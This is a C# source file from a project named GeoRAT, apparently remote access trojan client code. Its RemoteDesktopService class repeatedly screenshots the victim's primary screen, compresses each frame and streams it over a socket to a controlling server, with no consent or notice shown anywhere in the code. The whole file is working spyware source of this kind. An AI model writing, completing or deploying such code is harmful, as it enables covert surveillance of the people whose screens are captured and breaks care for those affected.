using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Windows.Forms;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;

namespace GeoRAT.Client.Core
{
    internal class RemoteDesktopService
    {
        public delegate void Disconnected(Socket s);
        public event Disconnected OnDisconnected;
        private readonly Socket _desktopSocket;
        internal RemoteDesktopService(Socket desktopSocket)
        {
            _desktopSocket = desktopSocket;
        }

        internal  void StartSession() 
        {
            Console.WriteLine("Sending Desktop Image to Server!\n");
            IUnsafeCodec unsafeCodec = new UnsafeStreamCodec();
            if (!_desktopSocket.Connected) return;
            while (true)
            {
                try
                {
                    var bmp = CaptureScreenShot();
                    Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    Size size = new System.Drawing.Size(bmp.Width, bmp.Height);
                    BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);
                    using (MemoryStream stream = new MemoryStream(10000000)) //allocate already enough memory to make it fast
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, rect, size, bmp.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            //send the stream over to the server
                            //to make it more stable we also send how big the stream of data is
                            _desktopSocket.Send(BitConverter.GetBytes((int)stream.Length));
                            _desktopSocket.BeginSend(stream.GetBuffer(), 0, (int)stream.Length, SocketFlags.None,
                                SessionCallBack, null);
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
                catch (Exception e)
                {
                    Console.WriteLine("An Error occured {0}", e.Message);
                    OnDisconnected?.Invoke(_desktopSocket);
                }
            }
        }


        internal void StopSession()
        {
            _desktopSocket.Close();
            
        }
        private  void SessionCallBack(IAsyncResult result)
        {
            var len = _desktopSocket.EndSend(result);
            Console.WriteLine("Sent {0} bytes", len );
        }


        private  Bitmap CaptureScreenShot()
        { 
          var rect = Screen.AllScreens[0].WorkingArea;
               try
                {
                    var bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                    var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                    gfxScreenshot.CopyFromScreen(0, 0, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                    gfxScreenshot.Dispose();
                    return bmpScreenshot;
                }
                catch { return new Bitmap(rect.Width, rect.Height); }
            }
        }

    }



 